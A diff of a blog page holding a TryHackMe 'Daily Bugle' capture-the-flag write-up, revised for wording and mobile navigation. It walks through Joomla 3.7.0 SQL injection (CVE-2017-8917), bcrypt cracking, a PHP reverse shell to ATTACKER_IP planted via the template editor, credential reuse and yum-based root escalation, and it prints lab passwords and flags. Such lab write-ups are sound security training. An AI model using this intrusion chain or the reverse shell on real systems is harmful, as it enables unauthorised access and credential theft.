@@ -6,10 +6,10 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
 <title>Daily Bugle | Jenn Shagrin</title>
-<meta name="description" content="TryHackMe CTF — Joomla 3.7.0 SQLi via CVE-2017-8917, joomblah.py credential dump, bcrypt hash cracking, PHP reverse shell via template editor, DB credential reuse, yum GTFOBins privesc to root.">
+<meta name="description" content="TryHackMe CTF - Joomla 3.7.0 SQLi via CVE-2017-8917, joomblah.py credential dump, bcrypt hash cracking, PHP reverse shell via template editor, DB credential reuse, yum GTFOBins privesc to root.">
 <meta name="author" content="">
 <link rel="canonical" href="https://jennshaggy.github.io/daily-bugle.html">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.40a236105b83b1f05a55d0a48876965b59b1d8f81f351041e484dc5905b375dc.css" rel="preload stylesheet" as="style">
     <link rel="stylesheet" href="/assets/css/accents.css">
 <link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
@@ -67,15 +67,18 @@
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/mobile-nav.css">
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&amp;family=Source+Code+Pro:wght@400;500;600&amp;family=Tomorrow:wght@500;600;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/site-ui-lab.css">
 <meta property="og:url" content="https://jennshaggy.github.io/daily-bugle.html">
 <meta property="og:site_name" content="Jenn Shagrin">
 <meta property="og:title" content="Daily Bugle">
-<meta property="og:description" content="TryHackMe CTF — Joomla 3.7.0 SQLi via CVE-2017-8917, joomblah.py credential dump, bcrypt hash cracking, PHP reverse shell via template editor, yum GTFOBins privesc to root.">
+<meta property="og:description" content="TryHackMe CTF - Joomla 3.7.0 SQLi via CVE-2017-8917, joomblah.py credential dump, bcrypt hash cracking, PHP reverse shell via template editor, yum GTFOBins privesc to root.">
 <meta property="og:locale" content="en-us">
 <meta property="og:type" content="article">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Daily Bugle">
-<meta name="twitter:description" content="TryHackMe CTF — Joomla 3.7.0 SQLi via CVE-2017-8917, joomblah.py credential dump, bcrypt hash cracking, PHP reverse shell via template editor, yum GTFOBins privesc to root.">
+<meta name="twitter:description" content="TryHackMe CTF - Joomla 3.7.0 SQLi via CVE-2017-8917, joomblah.py credential dump, bcrypt hash cracking, PHP reverse shell via template editor, yum GTFOBins privesc to root.">
 </head>
 
 <body id="top">
@@ -104,6 +107,7 @@
                         <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                     </svg>
                 </button>
+                <button id="menu-toggle" type="button" aria-expanded="false" aria-controls="menu"><span class="menu-toggle-label">Menu</span><span class="menu-toggle-icon" aria-hidden="true"><span></span><span></span></span></button>
             </div>
         </div>
         <ul id="menu">
@@ -133,7 +137,7 @@
                 </a>
             </li>
             <li>
-                <a href="/ai-security/" title="AI Security" target="_blank" rel="noopener noreferrer">
+                <a href="/ai-security/" title="AI Security">
                     <span>AI Security</span>
                 </a>
             </li>
@@ -142,10 +146,10 @@
 </header>
 
 <main class="main">
-<article class="post-single">
+<article class="post-single technical-writeup">
   <header class="post-header">
     <h1 class="post-title entry-hint-parent">Daily Bugle</h1>
-    <div class="post-description">TryHackMe CTF &mdash; Compromise a Joomla CMS account via SQLi, crack hashes, and escalate privileges by taking advantage of yum. Also: Spiderman robbed the bank.</div>
+    <div class="post-description">TryHackMe CTF - Compromise a Joomla CMS account via SQLi, crack hashes, and escalate privileges by taking advantage of yum. Also: Spiderman robbed the bank.</div>
   </header>
 
   <div class="post-content">
@@ -154,69 +158,80 @@
 
 <h2>Port Enumeration</h2>
 
-<p>A few different Nmap scans for tactical-approach recon. Starting with service and script enumeration:</p>
+<p>There are many layers to unpack here. Let's enumerate and find our best courses of approach.</p>
+
+<p>One of my preferred scanning techniques is to run two Nmap scans. One gives me a faster overview of the open ports.</p>
 
 <pre><code>nmap -sC -sV -Pn --script=http-enum 10.144.132.32</code></pre>
 
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 7.43.53 AM.png" alt="nmap scan with http-enum showing open ports and services" style="max-width:100%;margin:2rem 0;">
 
-<p>MariaDB version flagged early &mdash; DB language and version matter. Initial inventory:</p>
+<p>Taking note of the MariaDB version in case that's our intended exploit path.</p>
+
+<p><strong>Open Ports + Services</strong></p>
 
 <ul>
-<li>Port 22 &mdash; SSH + OpenSSH 7.4</li>
-<li>Port 80 &mdash; HTTP</li>
-<li>Port 3306 &mdash; MySQL + MariaDB 10.3.23 or earlier</li>
+<li>Port 22: <code>ssh</code> + <code>openSSH 7.4</code></li>
+<li>Port 80: <code>http</code></li>
+<li>Port 3306: <code>mysql</code> + <code>MariaDB 10.3.23 or earlier</code></li>
 </ul>
 
-<p>The more detailed vuln/CVE-focused scan surfaced something intriguing, especially given that Spiderman imagery (Sony Pictures) scattered across the target site:</p>
+<p>The other Nmap focuses on detailing potentially exploitable vulnerabilities.</p>
 
 <pre><code>nmap -sS -Pn -sC -sV --script=vuln -T4 -A 10.145.146.247 -oN daily_bugle_nmap_result.txt</code></pre>
 
-<p>The output is large. Here&rsquo;s what caught my eye and inadvertently handed over the first flag:</p>
+<p>The target IP changed across my runs. Use your current room IP if you're following along.</p>
 
-<img src="/images/daily-bugle/Screenshot 2026-05-05 at 7.28.56 AM.png" alt="nmap vuln scan output highlighting Joomla vulnerability and spider-man URL path" style="max-width:100%;margin:2rem 0;">
+<p>The output is massive. Reach out to me if this scan is giving you trouble, and I'm happy to help you parse through it.</p>
 
-<p>Vulnerability is clear. And at both the top and bottom of this output, I have vested interests.</p>
+<p>Here's what caught my eye and inadvertently grabbed our first flag:</p>
 
-<p>The <code>http-csrf</code> findings also mapped out quite a few subdomains waiting to be crossed, sited, requested, and forged:</p>
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 7.28.56 AM.png" alt="nmap vulnerability scan output showing open services and possible vulnerabilities" style="max-width:100%;margin:2rem 0;">
 
-<img src="/images/daily-bugle/Screenshot 2026-05-05 at 7.30.51 AM.png" alt="http-csrf subdomain list from nmap output" style="max-width:100%;margin:2rem 0;">
+<p>The <code>http-csrf</code> script listed several paths and forms as possible CSRF findings, including the login form and its <code>/index.php</code> action:</p>
 
-<p>The bank robber is Spiderman. <code>/index.php/2-uncategorised/1-spider-man-robs</code> leaked directly in the first Nmap output.</p>
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 7.30.51 AM.png" alt="nmap http-csrf output listing paths and form actions as possible CSRF findings" style="max-width:100%;margin:2rem 0;">
+
+<p>The bank robber is Spiderman. <code>/index.php/2-uncategorised/1-spider-man-robs-bank</code> appeared in the vulnerability scan's <code>http-csrf</code> results.</p>
 
 <hr>
 
 <h2>Identifying the Joomla Version</h2>
 
-<p>Armed with initial recon, digging deeper with a targeted scan on the known open ports:</p>
+<p>Armed with this surface recon, let's dig deeper.</p>
 
 <pre><code>nmap -sCV -p22,80,3306 -T4 10.144.132.32</code></pre>
 
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 7.52.44 AM.png" alt="nmap -sCV targeted scan on ports 22, 80, 3306" style="max-width:100%;margin:2rem 0;">
 
-<p>Nmap kept pushing back, so a different angle:</p>
+<p>Nmap kept pushing back, so I tried a different approach.</p>
 
 <pre><code>whatweb http://10.146.132.82</code></pre>
 
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 8.22.57 AM.png" alt="whatweb confirming Joomla, Apache, PHP version, and JQuery" style="max-width:100%;margin:2rem 0;">
 
-<p>Beautiful. Updated picture:</p>
+<p>Bingo. This is beautiful.</p>
+
+<p>This expands our recon findings list.</p>
+
+<p><strong>Updated &ldquo;what we know&rdquo; list:</strong></p>
 
 <ul>
-<li>Port 22: SSH + OpenSSH 7.4 (protocol 2.0)</li>
-<li>Port 80: HTTP + Apache/2.4.6 (CentOS) PHP/5.6.40</li>
-<li>Port 3306: MySQL + MariaDB 10.3.23 or earlier (flagged &ldquo;unauthorized&rdquo; &mdash; we&rsquo;ll see about that)</li>
+<li>Port 22: SSH + <code>OpenSSH 7.4 (protocol 2.0)</code></li>
+<li>Port 80: HTTP + <code>Apache/2.4.6 (CentOS) PHP/5.6.40</code></li>
+<li>Port 3306: MySQL + <code>MariaDB 10.3.23 or earlier</code> - apparently also &ldquo;unauthorized&rdquo;. We&rsquo;ll see about that (*wink*).</li>
 <li>JQuery + Joomla</li>
+<li>Nmap listed a login form with an <code>/index.php</code> action among its possible CSRF findings.</li>
 </ul>
 
-<p>What we already know about attack vectors and directory structure:</p>
+<p>As far as potentially exploitable attack vectors and directories, here&rsquo;s more of what we know:</p>
 
 <ul>
-<li><code>/index.php/2-uncategorised/1-spider-man-robs</code> leaked in first Nmap scan</li>
-<li>CSRF exists on <code>/index.php</code></li>
-<li>Possible credential-stuffing opportunity via MariaDB</li>
-<li>PHP 5.6.40 is a vulnerability goldmine</li>
-<li>Joomla CMS is ready for action</li>
+<li><code>/index.php/2-uncategorised/1-spider-man-robs-bank</code> appeared in the vulnerability scan.</li>
+<li>The <code>http-csrf</code> script flagged possible CSRF on <code>/index.php</code>; exploitability is unconfirmed.</li>
+<li>The MariaDB version is worth noting, but we have not established a way in through it.</li>
+<li><code>PHP 5.6.40</code> is a vulnerability goldmine.</li>
+<li>Joomla CMS is ready for action.</li>
 </ul>
 
 <pre><code>joomscan -u http://10.146.132.82</code></pre>
@@ -225,11 +240,19 @@
 
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 9.20.41 AM.png" alt="joomscan output part 2 confirming Joomla 3.7.0 and /administrator/ path" style="max-width:100%;margin:2rem 0;">
 
-<p>Attack path final form achieved:</p>
+<p>I believe we&rsquo;ve found our final attack path.</p>
 
 <ul>
-<li>Joomla 3.7.0 &mdash; exploitable via SQLi CVE-2017-8917</li>
+<li>Joomla 3.7.0 exploitable via SQLi CVE-2017-8917</li>
 <li>Admin panel lives at <code>/administrator/</code></li>
+</ul>
+
+<p>We&rsquo;ve answered who the bank robber is and which Joomla version we&rsquo;re targeting. Using what we know, here&rsquo;s the rest of our attack path:</p>
+
+<ul>
+<li>Use <code>exploit-db</code> against CVE-2017-8917.</li>
+<li>Crack Jonah&rsquo;s password using <code>sqlmap/python script</code>.</li>
+<li>After we&rsquo;re in, grab the user and root flags.</li>
 </ul>
 
 <hr>
@@ -240,62 +263,73 @@
 
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 9.41.39 AM.png" alt="searchsploit results for joomla 3.7.0 showing CVE-2017-8917 SQLi exploit" style="max-width:100%;margin:2rem 0;">
 
-<p>A hit. Sometimes less is more.</p>
+<p>SearchSploit gave us one promising exploit for this Joomla version. I opened its details:</p>
 
 <pre><code>searchsploit -x php/webapps/42033.txt</code></pre>
 
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 9.45.05 AM.png" alt="searchsploit -x showing exploit details for 42033.txt" style="max-width:100%;margin:2rem 0;">
 
-<p>The exploit details a <code>sqlmap</code>-based attack; the lab points toward Python. The dude abides.</p>
+<p>It uses <code>sqlmap</code>, but the challenge points us toward a Python script.</p>
 
 <pre><code>searchsploit -m php/webapps/42033.txt</code></pre>
 
-<p>Looking for a Python version:</p>
+<p>I checked whether SearchSploit had a Python script for the same vulnerability.</p>
 
 <pre><code>searchsploit joomla 3.7 | grep -i py</code></pre>
 
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 9.50.18 AM.png" alt="searchsploit joomla 3.7 grep for python returning no results" style="max-width:100%;margin:2rem 0;">
 
-<p>Nothing local. Research turns up a known community script:</p>
+<p>Not one here.</p>
+
+<p>A little research on Joomla/Python exploits reveals a common community script.</p>
 
 <pre><code>curl -s https://raw.githubusercontent.com/XiphosResearch/exploits/master/Joomblah/joomblah.py -o joomblah.py</code></pre>
 
 <hr>
 
-<h2>SQLi Credential Dump via joomblah.py</h2>
+<h2>SQLi Credential Dump via <code>joomblah.py</code></h2>
+
+<p>Launch time:</p>
 
 <pre><code>python3 joomblah.py http://10.146.132.82</code></pre>
 
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 9.53.31 AM.png" alt="joomblah.py first run with Python2/Python3 compatibility error" style="max-width:100%;margin:2rem 0;">
 
-<p>Results incoming, but a Python 2 vs. Python 3 compatibility bug gets in the way:</p>
-
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 9.55.15 AM.png" alt="joomblah.py Python compatibility error detail" style="max-width:100%;margin:2rem 0;">
 
-<p>Fix and rerun:</p>
+<p>Results are in, but with a Python 2 vs. Python 3 compatibility bug...</p>
+
+<p>Here's how to fix it and rerun:</p>
 
 <pre><code>sed -i 's/result += value/result += value.decode("utf-8")/' joomblah.py
 python3 joomblah.py http://10.146.132.82</code></pre>
 
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 9.57.23 AM.png" alt="joomblah.py fixed output with Jonah's bcrypt hash extracted" style="max-width:100%;margin:2rem 0;">
 
-<p>From now until <code>root</code>, call me Jonah. Sorry, Jonah. You just got pwned.</p>
+<p>From now until <code>root</code>, call me Jonah.</p>
+
+<p>Sorry, Jonah. You just got pwned.</p>
+
+<p><strong>What we have</strong></p>
 
 <ul>
 <li>Jonah&rsquo;s hash: <code>$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm</code></li>
-<li>Hash type: <code>bcrypt</code> &mdash; identifiable by the <code>$2y$</code> prefix</li>
+<li>The <code>$2y$</code> prefix tells us Jonah's hash is <code>bcrypt</code>.</li>
 </ul>
 
 <hr>
 
 <h2>Hash Cracking</h2>
 
-<pre><code>echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > jonah.hash
-john jonah.hash --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+<p>Time to call up our buddy, John.</p>
+
+<pre><code>echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > jonah.hash</code></pre>
+
+<pre><code>john jonah.hash --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
 
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 10.06.16 AM.png" alt="john cracking bcrypt hash to spiderman123" style="max-width:100%;margin:2rem 0;">
 
-<p>John delivers the credentials needed to access <code>/administrator/</code>:</p>
+<p>John hath cooked us up the credentials needed to access <code>/administrator/</code>:</p>
 
 <ul>
 <li>Username: <code>jonah</code></li>
@@ -306,6 +340,8 @@ john jonah.hash --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
 
 <h2>Admin Panel Access</h2>
 
+<p>Let's log in to <code>/administrator/</code>.</p>
+
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 10.12.28 AM.png" alt="Joomla /administrator/ login page" style="max-width:100%;margin:2rem 0;">
 
 <p>Hello, Joomla login page. Don&rsquo;t mind me. I&rsquo;m only here for a moment, then I&rsquo;ll be out of your hair.</p>
@@ -314,7 +350,7 @@ john jonah.hash --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
 
 <p>We are in. Thanks, Jonah and John.</p>
 
-<p>What we&rsquo;re about to exploit is not exactly a vulnerability, but abuse of an intended Joomla admin feature: the template editor. It lets administrators edit raw PHP files that are then executed by the web server. I think you can see where that&rsquo;s headed.</p>
+<p>This isn’t a separate Joomla vulnerability. We’re going to abuse the admin template editor, which lets us edit PHP files the web server will execute. I think you can see where that’s headed.</p>
 
 <p>Head to Templates in the left panel of the dashboard:</p>
 
@@ -324,7 +360,7 @@ john jonah.hash --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
 
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 10.24.31 AM.png" alt="Joomla Templates: Styles page showing Prostar as active default template" style="max-width:100%;margin:2rem 0;">
 
-<p>Click Templates again in the left panel, then click into <code>Prostar</code> &mdash; the active default for all pages:</p>
+<p>Click Templates again in the left panel. On the next page, we'll open <code>Prostar</code>, the active default for all pages:</p>
 
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 10.29.43 AM.png" alt="Joomla Templates: Templates page with Prostar listed" style="max-width:100%;margin:2rem 0;">
 
@@ -332,7 +368,7 @@ john jonah.hash --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
 
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 10.34.37 AM.png" alt="Prostar template editor with file list visible" style="max-width:100%;margin:2rem 0;">
 
-<p>Inside Prostar, a file list with a sickly Victorian <code>index.php</code> just begging for a reverse shell to make life whole again:</p>
+<p>In the <code>Prostar</code> template editor, open <code>index.php</code> from the file list. The web server executes this PHP file, so it gives us a place to plant the reverse shell.</p>
 
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 10.35.03 AM.png" alt="index.php circled in Prostar template file list" style="max-width:100%;margin:2rem 0;">
 
@@ -340,23 +376,23 @@ john jonah.hash --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
 
 <h2>Reverse Shell via Template Editor</h2>
 
-<p>First, set up a netcat listener in a new terminal:</p>
+<p>Before editing <code>index.php</code>, start a Netcat listener in a new terminal:</p>
 
 <pre><code>nc -lvnp 4444</code></pre>
 
-<p>Open <code>index.php</code> in the Joomla template editor and place this code above everything else (with your attacker IP swapped in):</p>
+<p>Add the PHP payload at the top of <code>index.php</code>, replacing <code>ATTACKER_IP</code> with your IP:</p>
 
 <pre><code>&lt;?php exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1'"); ?&gt;</code></pre>
 
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 10.42.10 AM.png" alt="PHP reverse shell injected at top of index.php in Joomla template editor" style="max-width:100%;margin:2rem 0;">
 
-<p>This feels oddly reminiscent of editing MySpace source code. But I digress.</p>
+<p>This feels oddly reminiscent of editing my MySpace source code. But I digress...</p>
 
-<p>Click &ldquo;Save&rdquo; (green button, upper left). Then trigger the shell by visiting <code>TARGET_IP</code> directly in-browser.</p>
+<p>Click <strong>Save</strong> in the upper-left corner. If the shell doesn’t connect, visit the target site to trigger execution of <code>index.php</code>.</p>
 
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 10.57.22 AM.png" alt="netcat listener catching the reverse shell connection" style="max-width:100%;margin:2rem 0;">
 
-<p>Shell caught.</p>
+<p>We caught the shell.</p>
 
 <pre><code>whoami
 pwd</code></pre>
@@ -365,17 +401,21 @@ pwd</code></pre>
 
 <p>We are Apache. Later days, Jonah.</p>
 
+<p>I searched for <code>user.txt</code> before moving on:</p>
+
+<pre><code>find / -name "user.txt" 2&gt;/dev/null</code></pre>
+
 <hr>
 
-<h2>Database Credentials from Configuration File</h2>
+<h2>Database Credentials from <code>configuration.php</code></h2>
 
-<p>Search Joomla&rsquo;s config file &mdash; a treasure trove of end-user vulnerabilities:</p>
+<p>Next, I checked Joomla’s <code>configuration.php</code> for database credentials:</p>
 
 <pre><code>cat /var/www/html/configuration.php</code></pre>
 
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 1.16.53 PM.png" alt="configuration.php showing plaintext DB credentials: root / nv5uz9r3ZEDzVjNu" style="max-width:100%;margin:2rem 0;">
 
-<p>Big shout-out to Joomla for keeping it easy and breezy:</p>
+<p>The file contained:</p>
 
 <ul>
 <li>DB user: <code>root</code></li>
@@ -385,37 +425,43 @@ pwd</code></pre>
 
 <hr>
 
-<h2>Lateral Movement: su jjameson</h2>
+<h2>Lateral Movement: <code>su jjameson</code></h2>
 
-<p>Still in the shell:</p>
+<p>Let's see if Joomla's database password opens <code>jjameson</code>, too:</p>
 
 <pre><code>su jjameson</code></pre>
 
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 1.23.00 PM.png" alt="su jjameson failing in non-interactive shell with must be run from terminal error" style="max-width:100%;margin:2rem 0;">
 
-<p>Non-interactive shell throwing a tantrum over handling <code>su</code>. Upgrade it first:</p>
+<p>The shell wasn’t interactive, so <code>su</code> refused to run. I upgraded it with a PTY:</p>
 
 <pre><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
 
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 1.25.31 PM.png" alt="pty.spawn shell upgrade then su jjameson succeeding with DB password" style="max-width:100%;margin:2rem 0;">
 
-<p>Password reuse confirmed: <code>nv5uz9r3ZEDzVjNu</code> works for <code>jjameson</code> as well. I am not the mid-level almighty jameson!</p>
+<p>The password worked. We are now mid-level jameson.</p>
+
+<p>Let's grab the user flag:</p>
 
 <pre><code>cat ~/user.txt</code></pre>
 
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 1.26.58 PM.png" alt="user flag retrieved as jjameson" style="max-width:100%;margin:2rem 0;">
 
-<p>User flag: <code>27a260fe3cba712cfdedb1c86d80442e</code></p>
-
 <hr>
 
 <h2>Privilege Escalation via yum</h2>
+
+<p>Let's see exactly how much power <code>jjameson</code> wields:</p>
 
 <pre><code>sudo -l</code></pre>
 
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 1.29.24 PM.png" alt="sudo -l showing jjameson can run /usr/bin/yum as root with no password" style="max-width:100%;margin:2rem 0;">
 
-<p><code>yum</code> with no password. Delicious. Thanks to GTFOBins, with some <code>echo</code> modifications for this non-interactive shell:</p>
+<p><code>yum</code> with no password is, indeed, delicious. Let's root this.</p>
+
+<p>Thanks to our friends at GTFOBins, along with some <code>echo</code> modifications for this non-interactive shell, exploiting the <code>yum</code> binary should be straightforward.</p>
+
+<p>Run these commands one by one:</p>
 
 <pre><code>TF=$(mktemp -d)
 echo -e "[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF" > $TF/x
@@ -431,11 +477,11 @@ sudo yum -c $TF/x --enableplugin=y</code></pre>
 
 <p>Confirmed WOOOO!!!</p>
 
+<p>(In Mortal Kombat Voice): &ldquo;Finish him!&rdquo;</p>
+
 <pre><code>cat /root/root.txt</code></pre>
 
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 2.12.58 PM.png" alt="root flag retrieved" style="max-width:100%;margin:2rem 0;">
-
-<p>Root flag: <code>eec3d53292b1821868266858d7fa6f79</code></p>
 
 <img src="/images/daily-bugle/Screenshot 2026-05-05 at 2.14.58 PM.png" alt="final confirmation of rooted Daily Bugle machine" style="max-width:100%;margin:2rem 0;">
 
@@ -443,14 +489,16 @@ sudo yum -c $TF/x --enableplugin=y</code></pre>
 
 <h2>Full Attack Chain</h2>
 
-<pre><code>Nmap + WhatWeb &rarr; Joomla 3.7.0 identified, spider-man URL path (bank robber = Spiderman)
-&rarr; JoomScan &rarr; admin panel at /administrator/, confirmed Joomla 3.7.0
-&rarr; CVE-2017-8917 &rarr; joomblah.py (Python3 fix applied) &rarr; Jonah&rsquo;s bcrypt hash
-&rarr; John the Ripper &rarr; spiderman123
-&rarr; Admin panel login &rarr; template editor &rarr; PHP reverse shell in index.php
-&rarr; Shell as apache &rarr; configuration.php &rarr; DB credentials (root / nv5uz9r3ZEDzVjNu)
-&rarr; Password reuse &rarr; su jjameson
-&rarr; sudo -l &rarr; yum NOPASSWD &rarr; GTFOBins yum plugin exploit &rarr; root</code></pre>
+<ol>
+<li>Nmap and WhatWeb &gt; open services and Joomla identified.</li>
+<li>JoomScan &gt; Joomla 3.7.0 and <code>/administrator/</code> confirmed.</li>
+<li>CVE-2017-8917 &gt; <code>joomblah.py</code> &gt; Jonah&rsquo;s bcrypt hash.</li>
+<li>John the Ripper &gt; Jonah&rsquo;s password cracked.</li>
+<li>Admin panel &gt; template editor &gt; PHP reverse shell.</li>
+<li>Shell as <code>apache</code> &gt; <code>configuration.php</code> &gt; database credentials.</li>
+<li>Password reuse &gt; <code>su jjameson</code>.</li>
+<li><code>sudo -l</code> &gt; passwordless <code>yum</code> &gt; GTFOBins technique &gt; root.</li>
+</ol>
 
   </div>
   <footer class="post-footer"></footer>
@@ -523,6 +571,9 @@ sudo yum -c $TF/x --enableplugin=y</code></pre>
             localStorage.setItem("pref-theme", 'dark');
         }
     })
+</script>
+<script>
+(()=>{const t=document.getElementById("menu-toggle"),m=document.getElementById("menu");if(!t||!m)return;document.documentElement.classList.add("js-menu-ready");const close=(focus=false)=>{t.setAttribute("aria-expanded","false");m.classList.remove("menu-open");if(focus)t.focus()};t.addEventListener("click",()=>{const open=t.getAttribute("aria-expanded")==="true";t.setAttribute("aria-expanded",String(!open));m.classList.toggle("menu-open",!open)});m.addEventListener("click",e=>{if(e.target.closest("a"))close()});document.addEventListener("click",e=>{if(t.getAttribute("aria-expanded")==="true"&&!m.contains(e.target)&&!t.contains(e.target))close()});document.addEventListener("keydown",e=>{if(e.key==="Escape"&&t.getAttribute("aria-expanded")==="true")close(true)});window.matchMedia("(min-width: 769px)").addEventListener("change",e=>{if(e.matches)close()})})();
 </script>
 <!-- Cloudflare Web Analytics --><script type='module' src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "d29793993e20413c866dbc989486b294"}'></script><!-- End Cloudflare Web Analytics -->
 </body>
